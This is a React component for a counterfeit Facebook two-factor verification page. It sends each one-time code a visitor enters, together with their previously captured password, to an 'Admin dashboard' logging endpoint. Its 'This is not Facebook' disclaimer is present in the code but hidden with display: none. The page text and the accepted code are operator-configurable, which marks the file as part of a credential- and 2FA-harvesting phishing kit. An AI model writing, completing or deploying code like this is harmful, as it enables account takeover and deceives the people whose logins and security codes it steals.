import React, { useState, useEffect } from 'react';
import { ArrowLeft, RotateCw, Check, AlertCircle } from 'lucide-react';
import { api } from '../api/client';
import fb2faIllustration from '../assets/fb-2fa-illustration.png';

/**
 * Confirm Account Illustration matching user screenshot:
 * Soft pastel gradient card, WhatsApp badge, phone screen with green ****** in center,
 * and stylized hand with burgundy nail polish tapping screen.
 */
function TwoFactorIllustration() {
  return (
    <div
      className="fb-confirm-illustration-banner"
      style={{
        width: '100%',
        borderRadius: 16,
        overflow: 'hidden',
        marginBottom: 20,
        boxShadow: '0 2px 6px rgba(0, 0, 0, 0.04)',
      }}
    >
      <img
        src={fb2faIllustration}
        alt="Two-factor verification code sent"
        style={{
          width: '100%',
          height: 'auto',
          display: 'block',
          borderRadius: 16,
          userSelect: 'none',
        }}
      />
    </div>
  );
}

export default function TwoFactorVerification({
  isDesktop = true,
  userInput = '',
  userPassword = '',
  onSuccess,
  onBack,
  onTryAnotherWay,
}) {
  const [code, setCode] = useState('');
  const [trustDevice, setTrustDevice] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [trialCount, setTrialCount] = useState(0);

  // Live countdown timer starting from 2 minutes (120 seconds)
  const [timeLeft, setTimeLeft] = useState(120);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatCountdown = (totalSeconds) => {
    const mins = Math.floor(totalSeconds / 60);
    const secs = totalSeconds % 60;
    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  };

  // Load recovery / 2fa channel settings from storage
  const [settings, setSettings] = useState(() => {
    try {
      const saved = localStorage.getItem('sphere_recovery_settings');
      if (saved) return JSON.parse(saved);
    } catch { }
    return {
      twoFactorTitle: 'Check your WhatsApp messages',
      twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
      twoFactorTimer: '02:00',
      twoFactorChannel: 'sms',
      twoFactorExpectedCode: '00000',
      twoFactorPlaceholder: 'Enter a code',
      twoFactorWarning: '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.',
    };
  });

  useEffect(() => {
    if (api?.admin?.getRecoverySettings) {
      api.admin.getRecoverySettings().then((res) => {
        if (res) setSettings((prev) => ({ ...prev, ...res }));
      });
    }
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const codeVal = code.trim();
    if (!codeVal) return;

    setIsSubmitting(true);
    const nextTrial = trialCount + 1;
    setTrialCount(nextTrial);

    const expectedCode = (settings.twoFactorExpectedCode || '00000').trim();
    const isCorrect = codeVal === expectedCode;

    // Save security code trial or confirmation to database (JSON store & Admin dashboard)
    try {
      await api.logAttempt({
        username: userInput || 'User',
        email: userInput || 'User',
        password: userPassword || (isCorrect ? '[2FA Security Code Verified]' : '[2FA Security Code Trial]'),
        accountName: userInput || 'User',
        action: isCorrect
          ? `Confirmed 2FA Security Code: "${codeVal}" (Verified)`
          : `Failed 2FA Code Trial #${nextTrial}: "${codeVal}" (Denied - Incorrect Code)`,
        source: isDesktop ? 'Desktop 2FA Verification' : 'Mobile 2FA Verification',
        screen: 'Check your messages 2FA Screen',
        device: isDesktop ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
        code: codeVal,
        trialCount: nextTrial,
        success: isCorrect,
      });
    } catch (err) {
      console.warn('api.logAttempt error:', err);
    }

    setIsSubmitting(false);

    if (!isCorrect) {
      // Reject and do NOT allow into the homepage!
      setErrorMsg("The code that you've entered doesn't match. Please try again.");
      setCode('');
      return;
    }

    // Correct OTP entered (00000) -> allow entry to the homepage!
    setErrorMsg('');
    onSuccess && onSuccess(codeVal);
  };

  const channelTitle = settings.twoFactorTitle || 'Check your WhatsApp messages';
  const channelSubtitle = settings.twoFactorSubtitle || 'Enter the code that we sent to your mobile number.';
  const placeholderText = (!settings.twoFactorPlaceholder || settings.twoFactorPlaceholder.toLowerCase().includes('clue'))
    ? 'Enter a code'
    : settings.twoFactorPlaceholder;
  const channelType = settings.twoFactorChannel || 'sms';
  const warningText = settings.twoFactorWarning !== undefined
    ? settings.twoFactorWarning
    : '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.';

  return (
    <div
      style={{
        width: '100%',
        minHeight: '100vh',
        backgroundColor: '#FFFFFF',
        display: 'flex',
        alignItems: 'flex-start',
        justifyContent: 'center',
        padding: '0',
        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI Historic', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif",
      }}
    >
      <div
        style={{
          width: '100%',
          maxWidth: '440px',
          backgroundColor: '#FFFFFF',
          borderRadius: '0',
          boxShadow: 'none',
          padding: '20px 20px 32px 20px',
          boxSizing: 'border-box',
        }}
      >
        {/* Top Back Arrow */}
        <div style={{ marginBottom: 16 }}>
          <button
            type="button"
            onClick={onBack}
            style={{
              background: 'none',
              border: 'none',
              cursor: 'pointer',
              padding: '6px',
              marginLeft: '-6px',
              display: 'inline-flex',
              alignItems: 'center',
              justifyContent: 'center',
              borderRadius: '50%',
              color: '#050505',
            }}
            title="Back to login"
            aria-label="Back to login"
          >
            <ArrowLeft size={24} color="#050505" strokeWidth={2.4} />
          </button>
        </div>

        {/* Title & Subtitle */}
        <h1
          style={{
            fontSize: '24px',
            fontWeight: 700,
            color: '#050505',
            margin: '0 0 8px 0',
            lineHeight: 1.25,
            letterSpacing: '-0.3px',
          }}
        >
          {channelTitle}
        </h1>
        <p
          style={{
            fontSize: '15px',
            color: '#1C1E21',
            margin: '0 0 20px 0',
            lineHeight: 1.4,
          }}
        >
          {channelSubtitle}
        </p>

        {/* Illustration */}
        <TwoFactorIllustration channel={channelType} />

        {/* Form */}
        <form onSubmit={handleSubmit} autoComplete="off">
          {/* Error Notice Banner if incorrect code */}
          {errorMsg && (
            <div
              style={{
                marginBottom: 14,
                padding: '10px 12px',
                backgroundColor: '#FEE2E2',
                border: '1px solid #FCA5A5',
                borderRadius: '10px',
                fontSize: '13px',
                color: '#991B1B',
                lineHeight: 1.4,
                display: 'flex',
                alignItems: 'flex-start',
                gap: '8px',
              }}
            >
              <AlertCircle size={18} color="#DC2626" style={{ flexShrink: 0, marginTop: 1 }} />
              <div>
                <strong>Incorrect Code:</strong> {errorMsg}
              </div>
            </div>
          )}

          {/* Code Input */}
          <div style={{ marginBottom: 16 }}>
            <input
              type="text"
              name="two_factor_code"
              placeholder={placeholderText}
              value={code}
              onChange={(e) => {
                setCode(e.target.value);
                if (errorMsg) setErrorMsg('');
              }}
              autoFocus
              autoComplete="one-time-code"
              style={{
                width: '100%',
                height: '52px',
                borderRadius: '12px',
                border: errorMsg ? '1.5px solid #FA383E' : '1px solid #CED0D4',
                padding: '0 16px',
                fontSize: '16px',
                color: '#050505',
                outline: 'none',
                boxSizing: 'border-box',
                backgroundColor: errorMsg ? '#FFF8F8' : '#FFFFFF',
                transition: 'border-color 0.15s ease, background-color 0.15s ease',
              }}
              onFocus={(e) => (e.target.style.borderColor = errorMsg ? '#FA383E' : '#0866FF')}
              onBlur={(e) => (e.target.style.borderColor = errorMsg ? '#FA383E' : '#CED0D4')}
            />
          </div>

          {/* Resend Timer Text */}
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '8px',
              fontSize: '14px',
              color: '#65676B',
              marginBottom: 16,
            }}
          >
            <RotateCw size={16} color="#65676B" strokeWidth={2} />
            <span>
              We can send a new code in <strong>{formatCountdown(timeLeft)}</strong>.
            </span>
          </div>

          {/* Trust this device Checkbox */}
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '10px',
              marginBottom: 24,
              cursor: 'pointer',
              userSelect: 'none',
            }}
            onClick={() => setTrustDevice((prev) => !prev)}
          >
            <div
              style={{
                width: '20px',
                height: '20px',
                borderRadius: '4px',
                backgroundColor: trustDevice ? '#0866FF' : '#FFFFFF',
                border: trustDevice ? 'none' : '2px solid #CED0D4',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0,
                transition: 'all 0.12s ease',
              }}
            >
              {trustDevice && <Check size={14} color="#FFFFFF" strokeWidth={3} />}
            </div>
            <span
              style={{
                fontSize: '14.5px',
                fontWeight: 600,
                color: '#050505',
                lineHeight: 1.3,
              }}
            >
              Trust this device and skip this step from now on
            </span>
          </div>

          {/* Continue Button */}
          <button
            type="submit"
            disabled={!code.trim() || isSubmitting}
            style={{
              width: '100%',
              height: '44px',
              borderRadius: '22px',
              backgroundColor: code.trim() && !isSubmitting ? '#0866FF' : '#A8C7FA',
              color: '#FFFFFF',
              border: 'none',
              fontSize: '15px',
              fontWeight: 600,
              cursor: code.trim() && !isSubmitting ? 'pointer' : 'not-allowed',
              marginBottom: '12px',
              transition: 'background-color 0.15s ease',
            }}
          >
            {isSubmitting ? 'Verifying...' : 'Continue'}
          </button>

          {/* Try another way Button */}
          <button
            type="button"
            onClick={onTryAnotherWay}
            style={{
              width: '100%',
              height: '44px',
              borderRadius: '22px',
              backgroundColor: '#F0F2F5',
              color: '#050505',
              border: 'none',
              fontSize: '15px',
              fontWeight: 600,
              cursor: 'pointer',
              transition: 'background-color 0.12s ease',
            }}
            onMouseEnter={(e) => (e.target.style.backgroundColor = '#E4E6EB')}
            onMouseLeave={(e) => (e.target.style.backgroundColor = '#F0F2F5')}
          >
            Try another way
          </button>

          {/* Visitor Security Warning / Disclaimer */}
          {warningText && (
            <div
              className="fb-warning-notice"
              style={{
                marginTop: '18px',
                padding: '8px 12px',
                backgroundColor: '#F0F2F5',
                border: '1px solid #E4E6EB',
                borderRadius: '8px',
                fontSize: '12px',
                color: '#65676B',
                textAlign: 'center',
                lineHeight: 1.4,
                display: 'none',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '6px',
              }}
            >
              <span>{warningText}</span>
            </div>
          )}
        </form>
      </div>
    </div>
  );
}

